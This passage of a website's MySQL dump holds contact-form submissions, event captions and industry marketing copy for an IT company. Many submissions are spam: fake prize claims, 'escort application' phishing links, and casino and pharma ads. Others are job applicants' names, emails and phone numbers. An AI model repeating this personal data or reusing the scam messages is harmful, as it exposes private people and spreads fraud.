(158, 'buyttrKIMVSixuqFYeDHjqXF', 'apalebaviyiw77@gmail.com', '5278377535', 1, 'wTVnMsWXuWHbzYRMGirgWRu', '', '2025-10-29 14:35:50', '2025-10-29 14:35:50'),
(159, 'Squiermtf', 'cxf781@gmail.com', '88255843981', 1, 'Europe, and in Ancient Russia', '', '2025-10-29 22:47:11', '2025-10-29 22:47:11'),
(160, 'Fortresstyh', 'guevara_oscar@sbcglobal.net', '88688155455', 1, NULL, '', '2025-10-30 03:19:02', '2025-10-30 03:19:02'),
(161, 'NAYUYUTY656308NERTHRTYHR', 'uwrxxyah@tacoblastmail.com', '85878126725', 1, 'MEKYUJTYJ656308MAERWETT', '', '2025-10-30 21:03:37', '2025-10-30 21:03:37'),
(162, 'Sunil singh Yadav', 'sunilsinghyadav516@gmail.com', '8303110106', 1, 'I\'m looking for ui/ux Designer job', '1761897379.pdf', '2025-10-31 06:56:19', '2025-10-31 06:56:19'),
(163, 'NAERTERHTE338867NEWETREWT', 'yvlrjuxk@tacoblastmail.com', '82811999615', 1, 'MERTHYTJTJ338867MARTHHDF', '', '2025-10-31 22:54:06', '2025-10-31 22:54:06'),
(164, 'NATREGTEGH2951895NEYHRTGE', 'jgwvpvjs@polosmail.com', '81859878483', 1, 'MEYJTJ2951895MARETRYTR', '', '2025-11-06 11:15:17', '2025-11-06 11:15:17'),
(165, 'Thank you so much for this newsletter Thank you so much for this newsletter\r\n 9745795 https://t.me appleipnoneipad !', 'fagi.hu.n.707@gmail.com', 'Thank you so much for this newsletter Thank you so much for this newsletter\r\n 9745795 https://t.me appleipnoneipad !', 1, NULL, '', '2025-11-09 09:30:53', '2025-11-09 09:30:53'),
(166, 'Rachelproob', 'cefeg.ah873@gmail.com', '89688678617', 1, 'I would add: also <a href=https://a-roof.by/xostel-grodno/><font color=#1C1C1C>see options in Hotels Hotels in Grodno, Rental housing are often good offers</font></a>.', '', '2025-11-09 11:21:26', '2025-11-09 11:21:26'),
(167, 'Williamnam', 'werso03430iu@rambler.ru', '89549482815', 1, 'Peгистpиpyйся ceйчас и пoлyчай пpивeтствeнный пaкeт — до 160 фpиcпинoв и до 1650USD бoнyca! \r\nЛучшие игры, быcтрыe выплaты и чecтный сервис на \r\nhttps://sportsworldhub.shop/bdoad7t', '', '2025-11-11 14:43:32', '2025-11-11 14:43:32'),
(168, 'Umair Hameed', 'umairhameed92@gmail.com', '03099803135', 0, 'Dear HR,\r\n\r\nPlease find attached my CV.\r\n\r\nRegards,\r\nUmair', '1762938146.pdf', '2025-11-12 08:02:26', '2025-11-12 08:02:26'),
(169, 'NAERTREGE600452NEYRTHYT', 'fespftoo@polosmail.com', '81799237376', 1, 'METYUTYJ600452MAVNGHJTH', '', '2025-11-16 15:15:39', '2025-11-16 15:15:39'),
(170, 'Briandoolo', 'brachman351@gmail.com', '86172115772', 1, '$111,394.98 is yours by participation—don’t let it slip https://telegra.ph/Youve-earned-11139498-11-25-10944', '', '2025-11-25 13:14:12', '2025-11-25 13:14:12'),
(172, 'Briandoolo', 'web@web.de', '87313119911', 1, '$80000 Free to Help You Celebrate Thanksgiving Big http://healthplus.or.kr/shop/bannerhit.php?bn_id=18&url=https%3A%2F%2F9734563782939.blogspot.com%3F6817', '', '2025-11-26 19:54:56', '2025-11-26 19:54:56'),
(174, 'Briandoolo', 'derekjimenez_1@outlook.com', '87995967888', 1, 'An $80000 Gift for a Fun-Filled Thanksgiving https://www.art-prizes.com/AdRedirector.aspx?ad=TheChurchie_2018&target=https%3A%2F%2F90032623.blogspot.com%3F5629', '', '2025-11-27 14:58:00', '2025-11-27 14:58:00'),
(176, 'keksgrits', '9t6wnqsb@gmail.com', '85651398765', 1, 'Photos for my escort application are uploaded.   \r\nLet me know if the quality is good.   \r\nPreview: https://tinyurl.com/33u27str', '', '2025-11-28 19:38:31', '2025-11-28 19:38:31'),
(177, 'Briandoolo', 'tenesha_ellis@icloud.com', '83111978756', 1, 'COLLECT YOUR $118,345.89 PRIZE: ACT NOW http://www.bead-media.com/cgi-bin/site.pl?url=https%3A%2F%2F54334087665.blogspot.com%3F8169', '', '2025-11-29 16:25:00', '2025-11-29 16:25:00'),
(179, 'keksgrits', 'nxfid27a@icloud.com', '87976833769', 1, 'Photos for my escort application are uploaded.   \r\nLet me know if the quality is good.   \r\nPreview: https://tinyurl.com/mphprn5p', '', '2025-11-29 17:55:49', '2025-11-29 17:55:49'),
(180, 'RobertGaw', 'dinanikolskaya99@gmail.com', '86226459323', 1, 'Hæ, ég vildi vita verð þitt.', '', '2025-12-01 04:53:35', '2025-12-01 04:53:35'),
(181, 'Briandoolo', 'sonjaboyle.sb@gmail.com', '83792555919', 1, 'Urgent Call: Claim Your $118,345.89 Jackpot Now https://telegra.ph/Claim-your-11834589-cash-prize-12-01-34134?87728456', '', '2025-12-01 19:56:10', '2025-12-01 19:56:10'),
(183, 'Usama Rehan Farooqi', 'ur476902@gmail.com', '03171522517', 0, NULL, '1764795281.pdf', '2025-12-03 19:54:41', '2025-12-03 19:54:41'),
(184, 'Briandoolo', 'rfyffe@breastscreen.org.au', '81848783465', 1, 'CLAIM YOUR $118,345.89 PRIZE BEFORE IT\'S GONE https://telegra.ph/You-won-11834589-withdraw-immediately-12-02-41353', '', '2025-12-03 21:11:44', '2025-12-03 21:11:44'),
(186, 'Wajahat Ullah Kiyani', 'wajahat.kiyani2000@gmail.com', '03105076331', 1, 'I am exploring better opportunities where I can work on new technologies, expand my skills, and contribute to modern development projects. Please consider my profile for any relevant position.', '1764849374.pdf', '2025-12-04 10:56:14', '2025-12-04 10:56:14'),
(187, 'keksgrits', '2tdk2osw@icloud.com', '82211899562', 1, 'Photos for my escort application are uploaded.   \r\nLet me know if the quality is good.   \r\nPreview: https://tinyurl.com/yc448xkz', '', '2025-12-04 17:27:48', '2025-12-04 17:27:48'),
(188, 'keksgrits', '0m2k3yfk@hotmail.com', '86171447559', 1, 'Photos for my escort application are uploaded.   \r\nLet me know if the quality is good.   \r\nPreview: https://tinyurl.com/yj2knh5z', '', '2025-12-05 20:36:57', '2025-12-05 20:36:57'),
(189, 'keksgrits', 'vq5quurw@hotmail.com', '83717653214', 1, 'Photos for my escort application are uploaded.   \r\nLet me know if the quality is good.   \r\nPreview: https://tinyurl.com/5ec2wpp8', '', '2025-12-07 19:59:52', '2025-12-07 19:59:52'),
(190, 'keksgrits', 'cultslbv@gmail.com', '84944354773', 1, 'Photos for my escort application are uploaded.   \r\nLet me know if the quality is good.   \r\nPreview: https://tinyurl.com/25fzxf24', '', '2025-12-10 05:41:27', '2025-12-10 05:41:27'),
(191, '* * * $3,222 credit available! Confirm your operation here: https://ieccodeonline.in/?5mf420 * * * hs=1db586ed9deff15550547be32df78eec* ххх*', 'ydx~nwa9pwyxz@mailbox.in.ua', '8tb873', 1, 'zd6tpk', '1765378736.jpg', '2025-12-10 13:58:56', '2025-12-10 13:58:56'),
(193, 'FeodorCox', 'fedorkolotovkin727@gmail.com', '81575894747', 1, 'Hi! Hope your day is going smoothly. \r\n \r\nDear Administrator, I provide grants to help websites achieve their goals. Your platform appears to meet my criteria. Interested in exploring this further? Please contact me on WhatsApp +447453801761', '', '2025-12-19 00:48:55', '2025-12-19 00:48:55'),
(194, 'keksgrits', '5jeczf0t@icloud.com', '84597732163', 1, 'Photos for my escort application are uploaded.   \r\nLet me know if the quality is good.   \r\nPreview: https://tinyurl.com/2xxcmz2u', '', '2025-12-20 10:42:43', '2025-12-20 10:42:43'),
(195, 'Thank you so much for this newsletter Thank you so much for this newsletter\r\n 7410792 https://t.me appleipnoneipad !', 'f.agi.h.u.n.70.7@gmail.com', 'Thank you so much for this newsletter Thank you so much for this newsletter\r\n 7410792 https://t.me appleipnoneipad !', 1, NULL, '', '2025-12-21 19:41:32', '2025-12-21 19:41:32'),
(196, 'Sadia Perveen', 'sadiyaperveen0925@gmail.com', '03062444737', 1, 'Hi, I\'m Sadia Perveen. Applying for internship at Creative IT Park. Are you offering internships? If yes, please share details.\r\nThanks!', '1766724563.pdf', '2025-12-26 03:49:23', '2025-12-26 03:49:23'),
(197, 'Jon Hooks', 'hooks.jon@gmail.com', '89849299', 1, 'World\'s First AI Agent Powered By ChatGPT-5…\r\nThat Writes And Ranks Anything We Want… On The First Page Of Google… With ZERO SEO. And Zero Ads… \r\n\r\nhttps://www.youtube.com/@AISolutionsTop', '', '2026-01-02 12:12:20', '2026-01-02 12:12:20'),
(198, 'keksgrits', 'ejzb346s@gmail.com', '83814464194', 1, 'Photos for my escort application are uploaded.   \r\nLet me know if the quality is good.   \r\nPreview: https://tinyurl.com/5y839azw', '', '2026-01-11 06:41:52', '2026-01-11 06:41:52'),
(199, 'keksgrits', 'k7ltdeya@icloud.com', '86283121696', 1, 'Photos for my escort application are uploaded.   \r\nLet me know if the quality is good.   \r\nPreview: https://tinyurl.com/45pxpzxx', '', '2026-01-12 22:56:49', '2026-01-12 22:56:49'),
(200, 'keksgrits', '0t0cum06@icloud.com', '84427739611', 1, 'Photos for my escort application are uploaded.   \r\nLet me know if the quality is good.   \r\nPreview: https://tinyurl.com/4u7xwvsx', '', '2026-01-13 03:27:34', '2026-01-13 03:27:34'),
(201, 'Danielfleda', 'jacksrenome@gmx.com', '83992841744', 1, 'Vertyowdiwjodko kofkosfjwgojfsjf oijwfwsfjowehgewjiofwj jewfkwkfdoeguhrfkadwknfew ijedkaoaswnfeugjfkadcajsfn creativeitpark.org', '', '2026-01-16 10:38:51', '2026-01-16 10:38:51'),
(202, 'Afaq', 'qmafaq@gmail.com', '03350495057', 0, 'qureshi', '1768830382.pdf', '2026-01-19 12:46:22', '2026-01-19 12:46:22'),
(203, 'Thank you so much for this newsletter Thank you so much for this newsletter\r\n 7986696 https://t.me appleipnoneipad !', 'f.agi.h.u.n707@gmail.com', 'Thank you so much for this newsletter Thank you so much for this newsletter\r\n 7986696 https://t.me appleipnoneipad !', 1, NULL, '', '2026-01-21 01:45:12', '2026-01-21 01:45:12'),
(204, 'Hamza Saleem', 'hamzasaleem3335@gmail.com', '03007915375', 1, 'Applying for a Developer Role Job', '1769589385.pdf', '2026-01-28 07:36:25', '2026-01-28 07:36:25'),
(205, 'MUHAMMAD ZOHAIB MUSHTAQ', 'arianzabi2@gmail.com', '03038478195', 1, 'hi i wannna join your company', '1769961297.pdf', '2026-02-01 14:54:57', '2026-02-01 14:54:57'),
(206, 'Asad Ullah', 'asadali1124khan@gmail.com', '03172211712', 0, 'Applying for opportunity for SEO Expert!', '1770318621.pdf', '2026-02-05 18:10:21', '2026-02-05 18:10:21'),
(207, 'Maryam Zia', 'meriemk0731@gmail.com', '03365863352', 0, NULL, '1771831068.pdf', '2026-02-23 06:17:48', '2026-02-23 06:17:48'),
(208, 'Harrison Scott', 'harrison.zerogvac@outlook.com', '17208159386', 1, 'Hey! We’re looking to fix our website and would really appreciate chatting with someone from your team about it.', '', '2026-02-24 14:31:21', '2026-02-24 14:31:21'),
(209, 'Mudassir khan', 'mudassirahmad5426@gmail.com', '03161962319', 1, 'My name is Mudassir Khan, and I am a Web Developer with over one year of experience in PHP, Laravel, CodeIgniter, MySQL, HTML, CSS, Bootstrap, and JavaScript.\r\nI look forward to the opportunity to discuss how my skills can benefit your team.', '1772088306.pdf', '2026-02-26 05:45:06', '2026-02-26 05:45:06'),
(210, 'NAYUYUTY1200535NERTYTRY', 'zpgfqcbk@fringmail.com', '86734475116', 1, 'MERYTRH1200535MARTHHDF', '', '2026-03-16 01:08:47', '2026-03-16 01:08:47'),
(211, 'Robertthise', 'b.e.s.tdeci.sio.n.pr.@gmail.com', '82688874716', 1, 'Solve your problems once and for all! \r\nIncredible feelings you\'ve never experienced before! \r\n<a href=https://www.vigrxplus.net/ct/947141>Treat your girlfriend today ;)</a>', '', '2026-03-18 10:25:31', '2026-03-18 10:25:31'),
(212, 'keksgrits', 'o9935w2h@yahoo.com', '89558454219', 1, 'Depressed mood dragging you down? You\'re not alone вЂ” and you don\'t have to stay stuck. Reliable solutions for better days ahead, delivered quietly to your door. Secure, affordable, no hassle. See what\'s available today. \r\nhttps://tinyurl.com/4hhbcumy', '', '2026-03-19 01:44:41', '2026-03-19 01:44:41'),
(213, 'keksgrits', 'eapf1eci@gmail.com', '82936825119', 1, 'Photos for my escort application are uploaded.   \r\nLet me know if the quality is good.   \r\nPreview: https://tinyurl.com/j5kx52wk', '', '2026-03-24 22:27:41', '2026-03-24 22:27:41'),
(214, 'keksgrits', 'bykerumy@gmail.com', '84373145776', 1, 'Photos for my escort application are uploaded.   \r\nLet me know if the quality is good.   \r\nPreview: https://tinyurl.com/y5k959v4', '', '2026-03-28 21:46:45', '2026-03-28 21:46:45'),
(215, 'Aline Hoffman', 'hoffman.aline47@yahoo.com', '9771390710', 1, 'We put your business on Hulu, Roku, and Live Sports for one flat rate. Once we find a qualified homeowner from your list, your brand follows them from the big-screen TV to the smartphone in their pocket. https://topshelfpromotion.com', '', '2026-04-04 10:51:53', '2026-04-04 10:51:53'),
(216, 'NAERTREGE2139343NEWETREWT', 'fykjrlql@tacoblastmail.com', '83741962432', 1, 'METRYTRH2139343MARTHHDF', '', '2026-04-10 22:08:49', '2026-04-10 22:08:49'),
(217, 'NAEWTRER1501075NEWETREWT', 'imqxswtz@tacoblastmail.com', '88165648985', 1, 'MERTYHRTHYHT1501075MAMYJRTH', '', '2026-04-10 22:15:12', '2026-04-10 22:15:12'),
(218, 'keksgrits', '6rzgf3sh@hotmail.com', '89929359566', 1, 'Photos for my escort application are uploaded.   \r\nLet me know if the quality is good.   \r\nPreview: https://tinyurl.com/538dhu2v', '', '2026-04-10 23:07:06', '2026-04-10 23:07:06'),
(219, 'Bridgett Bocanegra', 'bridgett.bocanegra21@gmail.com', '291848271', 1, 'Stop being the best-kept secret in your market. We put your brand on the big screen in front of your specific list of prospects on Hulu, Roku, and Live Sports. One flat rate. Total authority. No middleman fees.  http://www.topshelfpromotion.com', '', '2026-04-14 18:07:31', '2026-04-14 18:07:31'),
(220, 'Mashhood Basit', 'mashhoodbasit@gmail.com', '03360117342', 0, 'Digital Marketing\r\nHR & Recruitment\r\nBusiness Development\r\nGraphic Design', '1776429461.pdf', '2026-04-17 10:37:41', '2026-04-17 10:37:41'),
(221, 'Dyan Koch', 'koch.dyan@gmail.com', '5179206988', 1, 'That list of old customers sitting in your database is found money. We take those \"dead\" emails and show your professional commercials directly to them on their living room TVs. It’s a flat rate with zero management fees. http://www.topshelfpromotion.com', '', '2026-04-22 03:31:21', '2026-04-22 03:31:21'),
(222, 'Samira Solomon', 'solomon.samira@msn.com', '7276221305', 1, 'We put your business on Hulu, Roku, and Live Sports for one flat rate. Once we find a qualified homeowner from your list, your brand follows them from the big-screen TV to the smartphone in their pocket. https://topshelfpromotion.com', '', '2026-04-22 12:41:44', '2026-04-22 12:41:44'),
(223, 'Jerrod Waddell', 'waddell.jerrod@googlemail.com', '4444756', 1, 'Dominate every screen your prospects look at. We follow your target list from their living room TV to the smartphone in their pocket. We even edit your professional commercial for free. Check your area availability here:  http://topshelfpromotion.com', '', '2026-04-22 15:53:41', '2026-04-22 15:53:41'),
(224, 'Arnoldoimida', 'josephbrainiserch@gmail.com', '89763314453', 1, 'A new era has arrived...droids, androids...just touch it ) \r\n<u><a href=https://is.gd/mhHeib>For brainy people only )</a></u>', '', '2026-04-27 17:16:09', '2026-04-27 17:16:09'),
(225, 'Fahad Javaid', 'fahadjavaid114@gmail.com', '03086307638', 0, 'Dear, I am a 3rd year Computer Science student at FAST National University of Computer and Emerging Sciences. I am writing to ask if Creative IT Park is looking to organise a Summer Internship or relevant Program and any details about it.\r\n\r\nBest regards.', '1777802342.pdf', '2026-05-03 07:59:02', '2026-05-03 07:59:02'),
(226, 'Muhammad Maaz', 'muhammadmaaz153@gmail.com', '03331277798', 1, 'Hi team, caught a SQL truncation error on this form (fails >255 chars) and a typo (\"Tecognitions\"). I\'m a full-stack CS student applying for a SWE internship. Resume attached.  https://muhammadmaaz.live. Best, Muhammad Maaz.', '1778570557.pdf', '2026-05-12 05:22:37', '2026-05-12 05:22:37'),
(227, 'Hania', 'haniarajpoot918@gmail.com', '3368860681', 1, 'Summer Internship Application', '1779266235.pdf', '2026-05-20 06:37:15', '2026-05-20 06:37:15');

-- --------------------------------------------------------

--
-- Table structure for table `day_vendors`
--

CREATE TABLE `day_vendors` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `events`
--

CREATE TABLE `events` (
  `id` int(10) UNSIGNED NOT NULL,
  `description` varchar(255) NOT NULL,
  `picture` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `events`
--

INSERT INTO `events` (`id`, `description`, `picture`, `created_at`, `updated_at`) VALUES
(3, 'Umair Aftab, CEO of Creative IT Park (Pvt) Ltd., is receiving a shield at the job fair of Rawalpindi Women University from the Chairman of the Rawalpindi Chamber of Commerce.', '1760206552.webp', NULL, '2025-10-11 16:15:52'),
(4, 'Signing an MoU with the Capital Development Authority (CDA), Pakistan.', '1760206562.jpg', NULL, '2025-10-11 16:16:02'),
(7, 'Signing an MoU with the Rawalpindi Chamber of Commerce and Industry.', '1760206589.webp', NULL, '2025-10-11 16:16:29'),
(8, 'Meeting with the Secretary of the Higher Education Department, GOAJK.', '1760206597.webp', NULL, '2025-10-11 16:16:37'),
(11, 'Celebrating Independence day 2024.', '1760206606.webp', NULL, '2025-10-11 16:16:46'),
(12, 'Pink October Breast Cancer Awareness.', '1760206617.webp', NULL, '2025-10-11 16:16:57'),
(13, 'Celebrating 2nd Anniversary of Creative IT Park.', '1760206625.webp', NULL, '2025-10-11 16:17:05'),
(17, 'Behind the scenes at Creative IT Park', '1760206636.webp', NULL, '2025-10-11 16:17:16');

-- --------------------------------------------------------

--
-- Table structure for table `failed_jobs`
--

CREATE TABLE `failed_jobs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `uuid` varchar(255) NOT NULL,
  `connection` text NOT NULL,
  `queue` text NOT NULL,
  `payload` longtext NOT NULL,
  `exception` longtext NOT NULL,
  `failed_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `faqs`
--

CREATE TABLE `faqs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `question` text NOT NULL,
  `answer` text NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `faqs`
--

INSERT INTO `faqs` (`id`, `question`, `answer`, `created_at`, `updated_at`) VALUES
(1, 'What is the purpose of this pen?', '<p><span style=\"color:#cccccc;\">This pen is designed to provide web developers with boilerplate code for a FAQ Accordion.</span></p>', '2024-08-07 23:40:47', '2024-08-07 23:40:47'),
(2, 'What is an accordion?', '<p><span style=\"color:#cccccc;\">An accordion is a vertically stacked list of headers that users can click on to reveal more information about a business. With an accordion, when someone visits your web page, they will see a list of headers.</span></p>', '2024-08-07 23:49:09', '2024-08-07 23:49:09');

-- --------------------------------------------------------

--
-- Table structure for table `industries`
--

CREATE TABLE `industries` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `heading` varchar(255) NOT NULL,
  `slug` varchar(255) DEFAULT NULL,
  `detail` varchar(1024) DEFAULT NULL,
  `image` varchar(255) DEFAULT NULL,
  `icon` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `industries`
--

INSERT INTO `industries` (`id`, `heading`, `slug`, `detail`, `image`, `icon`, `created_at`, `updated_at`) VALUES
(1, 'Educational Services', 'educational-services', 'Elevate 1 educational institutions with our tailored IT solutions designed to enhance learning experiences, streamline administrative processes, and foster academic excellence. From student information systems and learning management platforms to virtual classrooms and educational apps, we offer comprehensive support to meet the evolving needs of schools, universities, and online learning platforms. \r\nWith a focus on innovation and technology integration, we empower educators and administrators to leverage digital tools effectively, drive student success, and stay ahead in the ever-changing educational landscape.', '1730197282.jpg', 'fa-graduation-cap', '2024-08-03 06:51:41', '2024-10-29 09:21:22'),
(2, 'Public Sectors', 'public-sectors', 'Elevate public sector organizations with our innovative IT solutions tailored to meet the unique challenges and goals of government agencies and institutions. From digital transformation and citizen engagement platforms to data analytics and cybersecurity, we specialize in providing comprehensive support to drive efficiency, transparency, and public trust.With a focus on delivering measurable results and enhancing service delivery, we partner with public sector leaders to create a positive impact and drive progress in their communities through cutting-edge technology solutions.', '1722687473.jpg', 'fa-landmark', '2024-08-03 07:17:53', '2024-08-03 07:17:53'),
(5, 'E-Commerce', 'e-commerce', '<p>Website development, mobile app development, SEO, and cloud computing are essential for e-commerce businesses looking to scale and enhance their customer experience. A well-designed website and mobile app ensure seamless navigation and convenience, while effective SEO strategies drive traffic and improve search engine rankings. Cloud computing offers scalability, security, and cost-efficiency, enabling businesses to handle increased traffic and data demands without compromising performance. These services, when integrated, provide a strong foundation for growth and improved customer satisfaction.</p>', '1729594464.jpg', 'fa-shopping-cart', '2024-10-21 04:42:25', '2024-10-22 08:54:24'),
(6, 'Health Care', 'health-care', '<p>Cloud computing provides secure and scalable data storage solutions, ensuring that sensitive patient information is protected while being easily accessible. Mobile app development enhances patient management by enabling features such as appointment scheduling, health tracking, and real-time communication between patients and healthcare providers. Additionally, content writing for medical blogs, paired with SEO strategies, helps healthcare platforms build trust, educate their audience, and improve online visibility, attracting more patients and establishing authority in the medical field.</p><p>&nbsp;</p><p>&nbsp;</p>', '1729594826.png', 'fa-heartbeat', '2024-10-21 04:44:51', '2024-10-22 09:00:26'),
(7, 'Education & E-learning', 'education-e-learning', '<p>Website and mobile app development are crucial for creating dynamic and accessible online learning platforms, providing students with a seamless and user-friendly experience across devices. A strong UI/UX design enhances student engagement by offering intuitive navigation, interactive features, and personalized learning experiences that keep users motivated and focused. Coupled with effective SEO strategies, these platforms can attract more learners by improving visibility in search engines, driving traffic, and increasing enrollment, making education more accessible to a broader audience.</p>', '1729617269.png', '', '2024-10-21 04:52:52', '2024-10-22 15:14:29'),
(8, 'Real Estate', 'real-estate', '<p>Websites and mobile apps for property listings provide a convenient and efficient way for users to search, view, and compare properties from any device. A well-designed platform ensures easy navigation, advanced search filters, and detailed property descriptions, enhancing the user experience. Graphic design plays a key role in creating eye-catching marketing materials such as brochures, ads, and banners that highlight property features. Social media marketing further amplifies reach, helping real estate businesses connect with a broader audience, showcase listings, and engage with potential buyers or renters on platforms like Instagram and Facebook.</p>', '1729617374.jpg', '', '2024-10-21 04:53:14', '2024-10-22 15:16:14'),
(9, 'Finance & Banking', 'finance-banking', '<p>In finance and banking, technology-driven solutions are essential for enhancing customer services, improving security, and optimizing operations. Online banking platforms and mobile apps provide users with 24/7 access to their accounts, enabling transactions, bill payments, and account management from anywhere. Additionally, secure data encryption and fraud detection systems safeguard customer information. Graphic design and branding materials help banks and financial institutions build trust and professionalism, while social media marketing can be used to promote financial products and services, engage with customers, and reach a broader audience in a competitive marketplace.</p>', '1729617997.jpg', '', '2024-10-21 04:54:23', '2024-10-22 15:26:37'),
(10, 'Retail & Consumer Goods', 'retail-consumer-goods', '<p>In the retail and consumer goods industry, technology and digital strategies play a pivotal role in driving growth and enhancing customer experience. E-commerce websites and mobile apps provide seamless shopping experiences, enabling customers to browse, purchase, and track orders easily. Effective UI/UX design keeps users engaged, while data analytics help retailers understand consumer preferences and optimize inventory. Social media marketing and SEO strategies boost brand visibility, driving traffic to online stores and physical locations. Additionally, cloud computing offers scalable solutions for inventory management, customer data storage, and supply chain optimization, ensuring efficiency across operations.</p>', '1729618437.jpg', '', '2024-10-21 04:54:59', '2024-10-22 15:33:57'),
(11, 'Logistics & Supply Chain', 'logistics-supply-chain', '<p>Technology-driven solutions are critical for improving efficiency, visibility, and cost-effectiveness in the logistics and supply chain industry. Cloud-based systems and real-time tracking tools allow for better inventory management, shipments, and deliveries, providing transparency across the supply chain. Mobile apps enhance coordination between drivers, warehouses, and customers by offering real-time updates and streamlined communication. Automation technologies, such as AI and IoT, optimize processes like order fulfilment and warehouse management. Additionally, data analytics help businesses forecast demand, reduce costs, and improve decision-making, while digital marketing and SEO strategies can attract new clients and partners.</p>', '1729618737.avif', '', '2024-10-21 04:55:42', '2024-10-22 15:38:57'),
(12, 'Entertainment & Media', 'entertainment-media', '<p>In the entertainment and media industry, digital platforms and technology play a significant role in content creation, distribution, and audience engagement. Websites and mobile apps allow for streaming, downloading, and sharing of multimedia content, providing users with on-demand access to films, music, and other entertainment. UI/UX design is essential to creating intuitive and immersive experiences that keep users engaged. Social media marketing helps promote content, engage with audiences, and build fan communities, while SEO strategies increase visibility and traffic. Additionally, cloud computing and AI are used for content storage, production workflows, and personalized content recommendations.</p>', '1729620317.jpg', '', '2024-10-21 04:56:01', '2024-10-22 16:05:17'),
(13, 'Tourism & Hospitality', 'tourism-hospitality', '<p>In the tourism and hospitality industry, technology is vital for enhancing customer experience and streamlining operations. Websites and mobile apps allow travelers to book accommodations, flights, and tours with ease, offering features like real-time availability and personalized recommendations. A well-designed UI/UX ensures smooth navigation, while mobile apps can provide features such as virtual tours and in-app customer support. Social media marketing and SEO are essential for attracting tourists by showcasing destinations, experiences, and promotions, while customer reviews and ratings help build trust. Additionally, cloud computing and data analytics optimize reservation systems, guest management, and personalized services, improving overall efficiency.</p>', '1729620800.jpg', '', '2024-10-21 04:56:27', '2024-10-22 16:13:20'),
(14, 'Startups & Tech Companies', 'startups-tech-companies', '<p>For startups and tech companies, innovative technology and digital strategies are key to growth and market penetration. Websites and mobile apps serve as essential platforms to showcase products, services, and company vision, while strong UI/UX design enhances user engagement and customer retention. SEO and digital marketing drive traffic, helping startups gain visibility and attract early adopters or investors. Cloud computing solutions offer scalability and cost-efficiency, allowing companies to expand without heavy infrastructure investments. Additionally, data analytics and automation improve decision-making and streamline operations, enabling startups to be agile, efficient, and competitive in fast-evolving markets.</p>', '1729621110.avif', '', '2024-10-21 04:56:44', '2024-10-22 16:18:30'),
(15, 'Manufacturing', 'manufacturing', '<p>In the manufacturing industry, digital technologies and automation are transforming production processes, improving efficiency, and reducing costs. Cloud computing and IoT-enabled systems provide real-time monitoring of equipment, inventory, and supply chains, ensuring smoother operations and predictive maintenance. Mobile apps enhance management and coordination on the factory floor by providing remote access to data and workflows. Additionally, automation technologies such as robotics streamline repetitive tasks, increasing productivity and minimizing errors. Data analytics help manufacturers optimize production, forecast demand, and reduce waste. Marketing strategies, including SEO and digital advertising, can promote products and attract business partners or clients in competitive markets.</p>', '1729621586.jpg', '', '2024-10-21 04:57:02', '2024-10-22 16:26:26'),
(16, 'Non-Profits & NGO\'s', 'non-profits-ngos', '<p>Non-profits and NGOs rely on digital tools and strategies to amplify their impact, raise awareness, and engage with donors and volunteers. A well-designed website and mobile app provide essential platforms for sharing their mission, collecting donations, and promoting events. Effective UI/UX design ensures easy navigation and clear calls to action, encouraging supporters to get involved. SEO and content marketing strategies help increase visibility, driving traffic to the organization\'s website and improving outreach efforts. Additionally, social media marketing allows these organizations to connect with broader audiences, share impactful stories, and foster community engagement, while data analytics optimize fundraising campaigns and resource allocation.</p>', '1729621773.jpg', '', '2024-10-21 04:57:25', '2024-10-22 16:29:33'),
(17, 'Legal & Consulting Services', 'legal-consulting-services', '<p>In the legal and consulting services sectors, technology plays a critical role in enhancing client engagement and operational efficiency. Websites and mobile apps serve as platforms for showcasing expertise, offering resources, and facilitating client interactions, such as scheduling consultations. A strong UI/UX design is essential for creating an intuitive experience that makes it easy for clients to access information and services. SEO strategies help firms increase their online visibility, attract new clients, and establish authority in their fields. Additionally, cloud-based solutions and data analytics streamline case management, document sharing, and collaboration, allowing firms to operate more effectively while maintaining security and compliance.</p>', '1729621897.avif', 'fa-balance-scale', '2024-10-21 04:57:42', '2024-10-22 16:31:37'),
(18, 'Telecommunications', 'telecommunications', '<p>In the telecommunications industry, digital advancements are essential for delivering reliable and high-speed connectivity to consumers and businesses. Websites and mobile apps allow customers to manage accounts, pay bills, and troubleshoot services with ease, enhancing customer experience and support. UI/UX design plays a key role in making these interactions smooth and accessible across various devices. Cloud computing enables scalable data storage and processing, improving network management and service delivery. Additionally, SEO and digital marketing strategies help telecom providers reach new customers, promote their services, and build brand loyalty in a competitive market. Data analytics further enhance operational efficiency by optimizing network performance, predicting maintenance needs, and understanding user behavior.</p>', '1730195795.jpg', '', '2024-10-21 04:58:01', '2024-10-29 08:56:35'),
(19, 'Fashion & Beauty', '', '<p>In the fashion and beauty industry, digital tools and marketing strategies are vital for reaching and engaging with customers in a highly competitive market. E-commerce websites and mobile apps provide a seamless shopping experience, allowing users to browse collections, view product details, and make purchases from any device. Strong UI/UX design enhances customer satisfaction by offering features like virtual try-ons, product recommendations, and easy navigation. Social media marketing and influencer collaborations are powerful for promoting products, building brand loyalty, and staying relevant. Additionally, SEO boosts online visibility, while data analytics help brands understand consumer preferences, predict trends, and personalize the shopping experience for each customer.</p>', '1730196803.jpg', 'fa-tshirt', '2024-10-21 04:58:25', '2024-10-29 09:13:23');

-- --------------------------------------------------------

--
-- Table structure for table `migrations`
--

